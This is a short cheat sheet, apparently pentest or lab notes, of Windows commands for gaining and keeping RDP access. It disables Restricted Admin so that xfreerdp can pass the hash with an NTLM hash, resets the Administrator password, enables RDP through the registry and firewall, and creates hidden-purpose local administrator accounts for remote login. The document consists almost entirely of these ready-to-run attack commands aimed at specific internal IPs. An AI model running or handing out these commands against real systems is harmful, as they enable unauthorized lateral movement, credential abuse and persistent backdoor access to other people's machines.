# For restricted access to RDP with hashes
```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /cert-ignore /u:yoshi /d:MEDTECH /pth:fdf36048c1cf88f5630381c5e38feb8e /v:172.16.186.82
```
------------------------ 

# Set up RDP by enabling RDP and adding administrator to RDP group
```bash
# change admin password
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "Administrator"
$UserAccount | Set-LocalUser -Password $Password

# enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# add administrator to RDP group
net localgroup "Remote Desktop Users" "Administrator" /add

# connect to rdp
xfreerdp  /u:Administrator /p:"test!" /v:192.168.236.121 
```
------------------------ 

# Set up RDP by creating a new user for RDP   
```bash
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```
------------------------ 

# Enabled RDP remotely (first we open the port and configure the server, then we create a new user)
```bash
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

$password = ConvertTo-SecureString "vau!XCKjNQBv3$" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```
